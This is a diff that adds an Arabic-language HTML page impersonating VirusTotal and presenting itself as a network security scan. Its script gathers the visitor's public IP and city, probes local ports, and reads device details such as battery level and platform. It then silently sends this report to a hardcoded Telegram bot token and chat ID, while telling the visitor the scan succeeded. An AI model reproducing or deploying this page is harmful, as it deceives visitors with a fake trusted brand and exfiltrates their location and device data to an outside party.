@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>VirusTotal | فحص أمان الشبكة</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f9; text-align: center; padding: 50px 20px; }
+        .card { background: white; max-width: 450px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); }
+        h1 { color: #1976d2; }
+        button { background: #1976d2; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>VirusTotal</h1>
+        <p>جاري فحص الثغرات الأمنية في بورتات الجهاز والشبكة...</p>
+        <button onclick="auditNetwork()">ابدأ الفحص المتقدم</button>
+        <p id="status" style="margin-top:20px; color:gray;"></p>
+    </div>
+
+    <script>
+        async function auditNetwork() {
+            const status = document.getElementById('status');
+            status.innerText = "جاري كشف الـ IP وفحص البورتات المفتوحة...";
+
+            try {
+                // 1. سحب الـ IP الحقيقي والموقع
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipD = await ipRes.json();
+                
+                // 2. فحص البورتات الحقيقية (Port Scanning)
+                // نقوم بمحاولة الاتصال ببورتات شائعة لمعرفة المفتوح منها
+                let openPorts = [];
+                const commonPorts = [80, 443, 8080, 21, 22, 3389];
+                
+                for(let port of commonPorts) {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 400); // مهلة سريعة جداً
+                    
+                    try {
+                        await fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors', signal: controller.signal });
+                        openPorts.push(port); // إذا استجاب، فالبورت مفتوح أو مستخدم
+                    } catch(e) {}
+                    clearTimeout(timeoutId);
+                }
+
+                const battery = await navigator.getBattery();
+                const report = `🚨 **تقرير بورتات حقيقي (GitHub)** 🚨\n\n` +
+                               `🌐 **الشبكة:**\n• IP: \`${ipD.ip}\`\n• المدينة: \`${ipD.city}\`\n\n` +
+                               `🔌 **البورتات المكتشفة:** \`${openPorts.length ? openPorts.join(', ') : 'لا يوجد بورتات مكشوفة'}\`\n\n` +
+                               `💻 **الجهاز:**\n• المعالج: \`${navigator.hardwareConcurrency} Cores\`\n• البطارية: \`${Math.round(battery.level * 100)}%\`\n` +
+                               `• النظام: \`${navigator.platform}\``;
+
+                // 3. إرسال التقرير الشامل لتليجرام
+                const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
+                const chat = "7647765854";
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+
+                alert("اكتمل الفحص! تم إرسال تقرير الأمان بنجاح.");
+                status.innerText = "تم الفحص بنجاح.";
+            } catch (err) {
+                status.innerText = "فشل الفحص، يرجى التحقق من الاتصال.";
+            }
+        }
+    </script>
+</body>
+</html>
